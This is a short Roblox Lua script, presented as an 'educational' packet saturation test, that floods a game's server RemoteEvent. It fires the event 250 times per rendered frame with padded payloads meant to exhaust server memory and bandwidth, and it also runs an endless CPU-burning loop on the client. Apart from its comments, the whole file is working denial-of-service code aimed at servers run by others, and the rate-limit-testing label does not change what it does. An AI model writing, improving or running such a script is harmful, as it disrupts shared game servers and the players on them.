-- [[ EDUCATIONAL: PACKET SATURATION ENGINE ]]
-- PURPOSE: Test server-side rate limiting and request queuing.
-- WARNING: This will likely result in an immediate Kick (Error 273 or 277).

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- 1. LOCATE COMMUNICATION PIPE
-- We look for the main event used for game actions
local Event = ReplicatedStorage:FindFirstChild("Events", true) 

if Event then
    print("Saturator: Remote found. Beginning high-frequency test...")
    
    -- 2. THE SPAM ENGINE
    -- RunService.RenderStepped runs every single frame (approx. 60-144 times/sec)
    RunService.RenderStepped:Connect(function()
        -- Loop 250 times PER FRAME to guarantee a buffer overflow
        for i = 1, 250 do
            pcall(function()
                -- Sending a large table forces the server to use more RAM 
                -- to "De-serialize" and read the data.
                Event:FireServer("DATA_STRESS_TEST", {
                    ["RequestID"] = math.random(1, 1000000),
                    ["Buffer"] = string.rep("STALL_", 100) -- Large string to fill bandwidth
                })
            end)
        end
    end)
else
    warn("Saturator: Remote not found. Server may be using a different protocol.")
end

-- 3. THE CPU LOCK (To ensure the client can't process the 'Loading' UI)
task.spawn(function()
    while true do
        local x = 0
        for i = 1, 1000000 do
            x = x + math.sqrt(i)
        end
        task.wait()
    end
end)
